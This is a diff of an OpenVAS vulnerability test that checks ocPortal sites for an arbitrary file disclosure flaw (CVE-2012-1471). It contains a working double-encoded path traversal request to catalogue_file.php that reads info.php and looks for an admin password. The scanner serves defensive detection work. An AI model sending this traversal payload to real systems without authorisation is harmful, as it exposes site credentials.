@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_ocportal_52768.nasl 3047 2016-04-11 13:58:34Z benallard $
+# $Id: gb_ocportal_52768.nasl 5700 2017-03-23 16:03:37Z cfi $
 #
 # ocPortal Arbitrary File Disclosure and Cross Site Scripting Vulnerabilities
 #
@@ -43,60 +43,51 @@ if (description)
  script_id(103459);
  script_bugtraq_id(52768);
  script_cve_id("CVE-2012-1471","CVE-2012-1470");
- script_version ("$Revision: 3047 $");
+ script_version ("$Revision: 5700 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("ocPortal Arbitrary File Disclosure and Cross Site Scripting Vulnerabilities");
-
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/52768");
  script_xref(name : "URL" , value : "http://ocportal.com/site/news/view/new-releases/ocportal-7-1-6-released.htm?filter=1%2C2%2C3%2C29%2C30");
  script_xref(name : "URL" , value : "http://ocportal.com/start.htm");
  script_xref(name : "URL" , value : "http://ocportal.com/site/news/view/ocportal-security-update.htm");
  script_xref(name : "URL" , value : "https://www.htbridge.com/advisory/HTB23078");
-
- script_tag(name:"last_modification", value:"$Date: 2016-04-11 15:58:34 +0200 (Mon, 11 Apr 2016) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-23 17:03:37 +0100 (Thu, 23 Mar 2017) $");
  script_tag(name:"creation_date", value:"2012-04-03 14:06:27 +0200 (Tue, 03 Apr 2012)");
- script_summary("Determine if it is possible to read info.php");
  script_category(ACT_ATTACK);
-  script_tag(name:"qod_type", value:"remote_vul");
+ script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
+
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
+
  exit(0);
 }
 
 include("http_func.inc");
-include("host_details.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
    
-port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
+port = get_http_port( default:80 );
+if( ! can_host_php( port:port ) ) exit( 0 );
 
-if(!can_host_php(port:port))exit(0);
+foreach dir( make_list_unique( "/ocportal", cgi_dirs( port:port ) ) ) {
 
-dirs = make_list("/ocportal",cgi_dirs());
+  if( dir == "/" ) dir = "";
+  url = dir + "/index.php";
+  buf = http_get_cache( item:url, port:port );
 
-foreach dir (dirs) {
-
-  url = string(dir, "/index.php"); 
-
-  if(http_vuln_check(port:port, url:url,pattern:"Powered by ocPortal")) {
-
-    url = string(dir, "/site/catalogue_file.php?original_filename=1.txt&file=%252e%252e%252f%252e%252e%252finfo.php");
-
-    if(http_vuln_check(port:port, url:url,pattern:"admin_password")) {
-     
-      security_message(port:port);
-      exit(0);
-    }  
-
+  if( "Powered by ocPortal" >< buf ) {
+    url = dir + "/site/catalogue_file.php?original_filename=1.txt&file=%252e%252e%252f%252e%252e%252finfo.php";
+    if( http_vuln_check( port:port, url:url, pattern:"admin_password" ) ) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
+    }
   }
 }
 
-exit(0);
-
+exit( 99 );
